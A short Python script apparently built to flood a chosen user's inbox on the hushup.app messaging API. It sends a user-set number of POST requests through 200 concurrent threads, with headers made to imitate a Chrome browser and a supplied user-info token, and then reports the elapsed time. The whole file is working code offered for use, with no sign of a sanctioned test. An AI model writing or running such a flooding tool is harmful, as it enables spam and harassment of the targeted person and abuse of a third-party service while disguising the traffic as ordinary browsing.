import json
import sys
import time
import timeit
from concurrent.futures import ThreadPoolExecutor

import requests
from tqdm import tqdm

if len(sys.argv) < 5:
    print("Insufficient arguments. Usage invoke.py <user> <x-user-info> <id> <iterations>")
    exit(0)

url = "https://api.hushup.app/user/" + sys.argv[1] + "/message"

headers = {
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'x-user-info': sys.argv[2],
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebK' +
                  'it/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/plain, */*',
    'Referer': 'https://hushup.app/',
    'sec-ch-ua-platform': '"macOS"'
}


def fireApi():
    payload = json.dumps({
        "message": str(round(time.time() * 10000000)),
        "id": sys.argv[3],
        "username": sys.argv[1],
        "version": 2
    })
    start = round((time.time() * 1000))
    requests.request("POST", url, headers=headers, data=payload, timeout=60.0)
    end = round((time.time() * 1000))
    if end - start > 60000:
        print("Request exceeded timeout")


def run_invoker():
    with tqdm(total=int(sys.argv[4])) as pbar:
        with ThreadPoolExecutor(max_workers=200) as executor:
            for x in range(int(sys.argv[4])):
                executor.submit(fireApi).add_done_callback(lambda temp_future: pbar.update(1))


print(f'Time taken: {timeit.timeit(run_invoker, number=1)} seconds')
